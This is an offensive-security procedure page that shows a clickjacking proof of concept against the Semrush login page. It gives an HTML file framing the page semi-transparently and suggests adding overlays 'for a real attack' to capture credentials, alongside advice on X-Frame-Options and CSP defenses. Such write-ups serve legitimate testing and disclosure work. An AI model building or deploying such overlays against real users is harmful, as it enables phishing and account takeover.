---
id: proc-clickjacking-semrush
tags:
  - clickjacking
  - ui-redressing
  - semrush
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:30:58.771Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Demonstrate-Clickjacking-on-Semrush-Login

## Summary

This procedure demonstrates a clickjacking vulnerability on the Semrush authentication login page at geo.semrush.com by embedding it in an unrestricted iframe, allowing attackers to overlay deceptive elements and trick users into entering credentials or performing actions leading to account takeover.

## Description

Clickjacking, or UI redressing, exploits the absence of protections like X-Frame-Options headers, enabling the target page to be loaded in an iframe. In this case, the Semrush SSO login page can be iframed locally via a simple HTML file, revealing the login interface. Attackers can then create transparent overlays to capture clicks and inputs, potentially stealing credentials. The browser-generated popup limits full exploitation, but the risk remains for phishing-like attacks. This targets web environments without specific prerequisites beyond a browser.

## Requirements

1. Web browser (e.g., Chrome, Firefox) to open local HTML files
2. Access to create and execute HTML files (no server needed for PoC)
3. Target URL: https://geo.semrush.com/ must be reachable

## Defense

Defensive measures and detection strategies:

- Implement X-Frame-Options: DENY or SAMEORIGIN header on login pages
- Use Content-Security-Policy (CSP) with frame-ancestors directive to restrict framing
- Monitor for unusual iframe embeddings via web application firewalls (WAF)
- Educate users on phishing risks and verify site authenticity

## Objectives

1. Confirm the login page can be embedded in an iframe
2. Simulate user deception to highlight credential theft potential
3. Demonstrate impact on account security

## Instructions

### Step 1: Create the Clickjacking PoC HTML File

**Context**: Build a basic HTML page that embeds the Semrush login URL in an iframe to test for frame-busting restrictions.

No command required; use a text editor to create the file.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Semrush Clickjacking PoC</title>
</head>
<body>
    <h1>Invisible Login Trap</h1>
    <iframe src="https://geo.semrush.com/" width="800" height="600" style="border: none; opacity: 0.5;"></iframe>
    <!-- Add overlay divs here for deception, e.g., <div style="position: absolute; top: 100px; left: 100px; width: 200px; height: 30px;"></div> -->
</body>
</html>
```

> This code loads the login page in the iframe. Adjust opacity and add overlays to align with form elements for a real attack.

### Step 2: Execute the PoC and Observe Embedding

**Context**: Open the HTML file in a browser to verify the login page loads without restrictions, confirming the vulnerability.

No command required; double-click the file or open via browser's file menu.

**Expected Output**: The Semrush SSO login page or popup appears inside the iframe, allowing interaction.

> If successful, the page embeds fully, enabling overlays for clickjacking. Failures would show errors like "Refused to display in a frame."

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[ui-redressing]]
- [[credential-theft]]
